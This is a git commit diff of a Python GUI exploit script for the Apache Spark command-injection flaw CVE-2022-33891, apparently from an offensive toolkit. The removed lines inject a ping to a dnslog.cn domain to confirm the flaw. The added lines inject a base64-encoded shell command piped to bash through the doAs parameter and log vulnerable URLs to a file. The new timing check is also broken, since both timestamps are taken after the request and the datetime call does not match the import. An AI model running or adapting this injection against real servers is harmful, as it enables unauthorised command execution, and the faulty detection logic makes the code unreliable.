b5ea6e516aab6bb238645e90224fb1ec64eed87d
W01fh4cker <sharecat2022@qq.com>
2022-07-20 17:32:42 +0800

    Update apache_spark_cve_2022_33891.py

--- exp/apache_spark_cve_2022_33891.py
+++ exp/apache_spark_cve_2022_33891.py
@@ -1,44 +1,27 @@
+from datetime import datetime
 import requests
 import tkinter as tk
 from tkinter import scrolledtext
 from concurrent.futures import ThreadPoolExecutor
 from ttkbootstrap.constants import *
 def apache_spark_cve_2022_33891_exp(target_url):
-    session = requests.session()
-    count = 0
-    dnslog_getdomain_url = 'http://www.dnslog.cn/getdomain.php?t=0'
+    targeturl = f'{target_url}/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`'
     try:
-        dnslog_getdomain_res = session.get(dnslog_getdomain_url, verify=False, timeout=20)
-        domain = dnslog_getdomain_res.text
-    except Exception as err:
-        apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
-        apache_spark_cve_2022_33891_text.see(END)
-    targeturl = f'{target_url}/?doAs=`ping {domain}`'
-    try:
-        res = session.get(url=targeturl, verify=False, timeout=20)
-        return res.status_code
-    except Exception as e:
-        apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(e) + "\n")
-        apache_spark_cve_2022_33891_text.see(END)
-    dnslog_getrecords_url = 'http://www.dnslog.cn/getrecords.php?t=0'
-    try:
-        dnslog_getrecords_res = session.get(dnslog_getrecords_url, verify=False, timeout=20)
-    except Exception as error:
-        apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(error) + "\n")
-        apache_spark_cve_2022_33891_text.see(END)
-    if domain in dnslog_getrecords_res.text:
-        if count == 0:
-            apache_spark_cve_2022_33891_text.insert(END, "【！！！！！！】存在漏洞的url：" + targeturl + "\n")
+        res = requests.post(url=targeturl, verify=False, timeout=20, allow_redirects=False)
+        t1 = datetime.datetime.now()
+        t2 = datetime.datetime.now()
+        delta = t2 - t1
+        if delta.seconds < 10:
+            apache_spark_cve_2022_33891_text.insert(END, "【×】不存在漏洞的url：" + targeturl + "\n")
             apache_spark_cve_2022_33891_text.see(END)
-            with open("存在Apache Spark 远程命令执行漏洞(CVE-2022-33891)的url.txt", 'a') as f:
-                f.write(targeturl + "\n")
         else:
             apache_spark_cve_2022_33891_text.insert(END, "【！！！！！！】存在漏洞的url：" + targeturl + "\n")
             apache_spark_cve_2022_33891_text.see(END)
             with open("存在Apache Spark 远程命令执行漏洞(CVE-2022-33891)的url.txt", 'a') as f:
                 f.write(targeturl + "\n")
-    else:
-        apache_spark_cve_2022_33891_text.insert(END, "【×】不存在漏洞的url：" + targeturl + "\n")
+        exit(0)
+    except Exception as e:
+        apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(e) + "\n")
         apache_spark_cve_2022_33891_text.see(END)
 def get_apache_spark_cve_2022_33891_addr():
     with open("修正后的url.txt","r") as f:
